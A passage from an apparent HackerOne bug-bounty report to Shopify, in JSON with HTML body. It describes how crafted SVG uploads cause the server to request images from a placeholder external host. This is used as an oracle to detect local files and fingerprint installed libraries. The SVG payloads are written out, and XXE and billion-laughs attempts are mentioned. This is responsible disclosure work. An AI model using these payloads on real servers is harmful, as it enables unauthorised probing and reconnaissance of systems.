class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<ul>\n<li>The &quot;a billion laughs&quot; attack - see <a title=\"https://en.wikipedia.org/wiki/Billion_laughs\" href=\"/redirect?signature=c03e457025b9b802e2c89f6cc191d65c0a481488&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FBillion_laughs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://en.wikipedia.org/wiki/Billion_laughs</span><i class=\"icon-external-link\"></i></a> - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.</li>\n<li>However, the parser <em>doesn&#39;t</em> like SYSTEM Entities, we can <em>not</em> specify a different DTD file, add SYSTEM entities or any other XXE attack.</li>\n</ul>\n\n<p>But we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>\n<span class=\"nt\">&lt;svg</span> <span class=\"na\">xmlns:svg=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns:xlink=</span><span class=\"s\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;200&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;http://&lt;EXAMPLE_SERVER&gt;:81/example.png&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;http://&lt;EXAMPLE_SERVER&gt;:999/example.png&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;20&quot;</span> <span class=\"na\">font-size=</span><span class=\"s\">&quot;20&quot;</span><span class=\"nt\">&gt;</span>test<span class=\"nt\">&lt;/text&gt;</span>\n<span class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<p>This results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does <em>not</em> work with non-image files like /etc/passwd):</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>\n<span class=\"nt\">&lt;svg</span> <span class=\"na\">xmlns:svg=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns:xlink=</span><span class=\"s\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;200&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;/lib/plymouth/ubuntu_logo.png&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;http://&lt;EXAMPLE_SERVER&gt;:999/example.png&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;20&quot;</span> <span class=\"na\">font-size=</span><span class=\"s\">&quot;20&quot;</span><span class=\"nt\">&gt;</span>test<span class=\"nt\">&lt;/text&gt;</span>\n<span class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<p>The following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):</p>\n\n<ul>\n<li>/usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)</li>\n<li>/usr/share/doc/libfreetype6/tutorial/metrics.png </li>\n<li>/usr/share/doc/libexpat1-dev/expat.html/expat.png</li>\n</ul>\n", 
    "severity_rating": "low", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}